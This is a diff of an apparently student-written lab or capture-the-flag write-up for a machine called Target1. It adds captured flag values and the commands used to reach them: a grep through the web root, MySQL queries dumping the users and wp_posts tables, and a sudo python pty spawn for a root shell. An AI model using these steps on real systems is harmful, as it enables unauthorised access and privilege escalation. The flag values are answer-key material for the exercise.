@@ -100,7 +100,15 @@ TODO Note: Explain at least 3 alerts. Add more if time allows.
 
 - flag1.txt: flag1{b9bbcb33e11b80be759c4e844862482d}
 - ![Flag1](https://user-images.githubusercontent.com/79546857/129992218-82f6f52f-239c-46d0-8db6-37b0a57efdf7.JPG)
-TODO: Include the command run
-- flag2.txt: flag1{b9bbcb33e11b80be759c4e844862482d
+- michael@target1:/var/www$ grep -RE flag html
+
+- flag2.txt: flag2{fc3fd58dcdad9ab23faca6e9a36e581c
 - ![Flag2](https://user-images.githubusercontent.com/79546857/129992231-2f215c98-1a2d-40f8-ade9-71aff735515f.JPG)
 
+- flag3.txt: flag3{afc01ab56b50591e7dccf93122770cd2}
+- mysql> show tables;
+- mysql> select * from users;
+- mysql> select * from wp_posts;
+
+- flag4.txt: flag4{715dea6c055b9fe3337544932f2941ce}
+- sudo python -c 'import pty;pty.spawn('/bin/bash");'
